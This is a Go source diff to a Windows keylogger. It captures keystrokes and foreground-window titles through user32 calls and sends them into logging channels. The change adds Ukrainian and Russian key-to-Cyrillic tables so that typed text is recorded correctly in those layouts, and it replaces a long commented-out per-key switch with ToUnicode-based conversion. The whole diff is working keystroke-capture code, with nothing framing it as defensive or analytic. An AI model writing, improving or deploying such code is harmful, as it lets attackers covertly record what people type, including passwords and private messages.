@@ -20,12 +20,83 @@ var (
 	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
 	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
 	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
-	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
-	procMapVirtualKey            = user32.NewProc("MapVirtualKeyA")
-	procToUnicode                = user32.NewProc("ToUnicode")
+	// procGetKeyboardState         = user32.NewProc("GetKeyboardState")
+	procMapVirtualKey = user32.NewProc("MapVirtualKeyA")
+	procToUnicode     = user32.NewProc("ToUnicode")
 
 	tmpTitle string
 )
+
+var keyToUa = map[int32]int32{
+	0x51:               0x0439,
+	0x57:               0x0446,
+	0x45:               0x0443,
+	0x52:               0x043A,
+	0x54:               0x0435,
+	0x59:               0x043D,
+	0x55:               0x0433,
+	0x49:               0x0448,
+	0x4F:               0x0449,
+	0x50:               0x0437,
+	constants.VK_OEM_4: 0x0445,
+	constants.VK_OEM_6: 0x0457,
+	0x41:               0x0444,
+	0x53:               0x0456,
+	0x44:               0x0432,
+	0x46:               0x0430,
+	0x47:               0x043F,
+	0x48:               0x0440,
+	0x4A:               0x043E,
+	0x4B:               0x043B,
+	0x4C:               0x0434,
+	constants.VK_OEM_1: 0x0436,
+	constants.VK_OEM_7: 0x0454,
+	0x5A:               0x044F,
+	0x58:               0x0447,
+	0x43:               0x0441,
+	0x56:               0x043C,
+	0x42:               0x0438,
+	0x4E:               0x0442,
+	0x4D:               0x044C,
+	constants.VK_OEM_COMMA:  0x0431,
+	constants.VK_OEM_PERIOD: 0x044E,
+}
+
+var keyToRu = map[int32]int32{
+	constants.VK_OEM_3: 0x0451,
+	0x51:               0x0439,
+	0x57:               0x0446,
+	0x45:               0x0443,
+	0x52:               0x043A,
+	0x54:               0x0435,
+	0x59:               0x043D,
+	0x55:               0x0433,
+	0x49:               0x0448,
+	0x4F:               0x0449,
+	0x50:               0x0437,
+	constants.VK_OEM_4: 0x0445,
+	constants.VK_OEM_6: 0x044A,
+	0x41:               0x0444,
+	0x53:               0x044B,
+	0x44:               0x0432,
+	0x46:               0x0430,
+	0x47:               0x043F,
+	0x48:               0x0440,
+	0x4A:               0x043E,
+	0x4B:               0x043B,
+	0x4C:               0x0434,
+	constants.VK_OEM_1: 0x0436,
+	constants.VK_OEM_7: 0x044D,
+	0x5A:               0x044F,
+	0x58:               0x0447,
+	0x43:               0x0441,
+	0x56:               0x043C,
+	0x42:               0x0438,
+	0x4E:               0x0442,
+	0x4D:               0x044C,
+	constants.VK_OEM_COMMA:  0x0431,
+	constants.VK_OEM_PERIOD: 0x044E,
+}
 
 var tmpKeylog = make(chan string)
 var tmpWindow = make(chan string)
@@ -41,19 +112,19 @@ func getForegroundWindow() (hwnd syscall.Handle, err error) {
 	return
 }
 
-func getKeyboardState(keyboardState *uint16) (len int32, err error) {
-	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
-	len = int32(r0)
+// func getKeyboardState(keyboardState *uint16) (len int32, err error) {
+// 	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
+// 	len = int32(r0)
 
-	if len == 0 {
-		if e1 != 0 {
-			err = error(e1)
-		} else {
-			err = syscall.EINVAL
-		}
-	}
-	return
-}
+// 	if len == 0 {
+// 		if e1 != 0 {
+// 			err = error(e1)
+// 		} else {
+// 			err = syscall.EINVAL
+// 		}
+// 	}
+// 	return
+// }
 
 func mapVirtualKey(uCode syscall.Handle) (scanCode syscall.Handle, err error) {
 	r0, _, e1 := syscall.Syscall(procMapVirtualKey.Addr(), 2, uintptr(uCode), 0, 0)
@@ -124,7 +195,7 @@ func windowLogger() {
 		if getForegroundWindowErr != nil {
 			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
 		}
-		window := make([]uint16, 200)
+		window := make([]uint16, 256)
 		getWindowText(foregroundWindow, &window[0], int32(len(window)))
 
 		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
@@ -135,7 +206,7 @@ func windowLogger() {
 	}
 }
 
-func getLanguage() {
+func getLanguage() int {
 	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
 	if getForegroundWindowErr != nil {
 		log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
@@ -157,29 +228,40 @@ func getLanguage() {
 		log.Fatalf("languageCodeErr -> %v", languageCodeErr)
 	}
 
-	switch languageID {
-	case 409:
-		fmt.Printf("Language: %v \r\n", constants.US)
-	case 422:
-		fmt.Printf("Language: %v \r\n", constants.UA)
-	case 419:
-		fmt.Printf("Language: %v \r\n", constants.RU)
-	}
+	return languageID
 }
 
 func getUnicodeKey(virtualCode int) string {
-	keyboardBuf := make([]uint16, 200)
-	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
-	if getKeyboardStateErr != nil {
-		log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
-	}
+	keyboardBuf := make([]uint16, 256)
+
+	// _, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
+	// if getKeyboardStateErr != nil {
+	// 	log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
+	// }
 
 	scanCode, mapVirtualKeyErr := mapVirtualKey(syscall.Handle(virtualCode))
 	if mapVirtualKeyErr != nil {
 		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
 	}
 
-	unicodeBuf := make([]uint16, 200)
+	// TEST LANGUAGE
+	languageID := getLanguage()
+	switch languageID {
+	case constants.US:
+		fmt.Printf("Language: United States (US) \r\n")
+	case constants.UA:
+		for key, val := range keyToUa {
+			keyboardBuf[int(key)] = uint16(val)
+		}
+		fmt.Printf("Language: Ukraine (UA) \r\n")
+	case constants.RU:
+		for key, val := range keyToRu {
+			keyboardBuf[int(key)] = uint16(val)
+		}
+		fmt.Printf("Language: Russia (RU) \r\n")
+	}
+
+	unicodeBuf := make([]uint16, 256)
 	toUnicode(syscall.Handle(virtualCode), scanCode, &keyboardBuf[0], &unicodeBuf[0])
 	return syscall.UTF16ToString(unicodeBuf)
 }
@@ -327,122 +409,8 @@ func keyLogger() {
 				tmpKeylog <- "[RightMenu]"
 			default:
 				getLanguage()
-				tmpKeylog <- getUnicodeKey(Key)
-				// case constants.VK_OEM_1:
-				// 	tmpKeylog <- ";"
-				// case constants.VK_OEM_2:
-				// 	tmpKeylog <- "/"
-				// case constants.VK_OEM_3:
-				// 	tmpKeylog <- "`"
-				// case constants.VK_OEM_4:
-				// 	tmpKeylog <- "["
-				// case constants.VK_OEM_5:
-				// 	tmpKeylog <- "\\"
-				// case constants.VK_OEM_6:
-				// 	tmpKeylog <- "]"
-				// case constants.VK_OEM_7:
-				// 	tmpKeylog <- "'"
-				// case constants.VK_OEM_PERIOD:
-				// 	tmpKeylog <- "."
-				// case 0x30:
-				// 	tmpKeylog <- "0"
-				// case 0x31:
-				// 	tmpKeylog <- "1"
-				// case 0x32:
-				// 	tmpKeylog <- "2"
-				// case 0x33:
-				// 	tmpKeylog <- "3"
-				// case 0x34:
-				// 	tmpKeylog <- "4"
-				// case 0x35:
-				// 	tmpKeylog <- "5"
-				// case 0x36:
-				// 	tmpKeylog <- "6"
-				// case 0x37:
-				// 	tmpKeylog <- "7"
-				// case 0x38:
-				// 	tmpKeylog <- "8"
-				// case 0x39:
-				// 	tmpKeylog <- "9"
-				// case 0x41:
-				// 	getLanguage()
-				// 	tmpKeylog <- "a"
-				// case 0x42:
-				// 	getLanguage()
-				// 	tmpKeylog <- "b"
-				// case 0x43:
-				// 	getLanguage()
-				// 	tmpKeylog <- "c"
-				// case 0x44:
-				// 	getLanguage()
-				// 	tmpKeylog <- "d"
-				// case 0x45:
-				// 	getLanguage()
-				// 	tmpKeylog <- "e"
-				// case 0x46:
-				// 	getLanguage()
-				// 	tmpKeylog <- "f"
-				// case 0x47:
-				// 	getLanguage()
-				// 	tmpKeylog <- "g"
-				// case 0x48:
-				// 	getLanguage()
-				// 	tmpKeylog <- "h"
-				// case 0x49:
-				// 	getLanguage()
-				// 	tmpKeylog <- "i"
-				// case 0x4A:
-				// 	getLanguage()
-				// 	tmpKeylog <- "j"
-				// case 0x4B:
-				// 	getLanguage()
-				// 	tmpKeylog <- "k"
-				// case 0x4C:
-				// 	getLanguage()
-				// 	tmpKeylog <- "l"
-				// case 0x4D:
-				// 	getLanguage()
-				// 	tmpKeylog <- "m"
-				// case 0x4E:
-				// 	getLanguage()
-				// 	tmpKeylog <- "n"
-				// case 0x4F:
-				// 	getLanguage()
-				// 	tmpKeylog <- "o"
-				// case 0x50:
-				// 	getLanguage()
-				// 	tmpKeylog <- "p"
-				// case 0x51:
-				// 	getLanguage()
-				// 	tmpKeylog <- "q"
-				// case 0x52:
-				// 	getLanguage()
-				// 	tmpKeylog <- "r"
-				// case 0x53:
-				// 	getLanguage()
-				// 	tmpKeylog <- "s"
-				// case 0x54:
-				// 	getLanguage()
-				// 	tmpKeylog <- "t"
-				// case 0x55:
-				// 	getLanguage()
-				// 	tmpKeylog <- "u"
-				// case 0x56:
-				// 	getLanguage()
-				// 	tmpKeylog <- "v"
-				// case 0x57:
-				// 	getLanguage()
-				// 	tmpKeylog <- "w"
-				// case 0x58:
-				// 	getLanguage()
-				// 	tmpKeylog <- "x"
-				// case 0x59:
-				// 	getLanguage()
-				// 	tmpKeylog <- "y"
-				// case 0x5A:
-				// 	getLanguage()
-				// 	getUnicodeKey(0x5A)
-				// 	tmpKeylog <- "z"
+				unicodeKey := getUnicodeKey(Key)
+				tmpKeylog <- unicodeKey
 			}
 		}
 	}
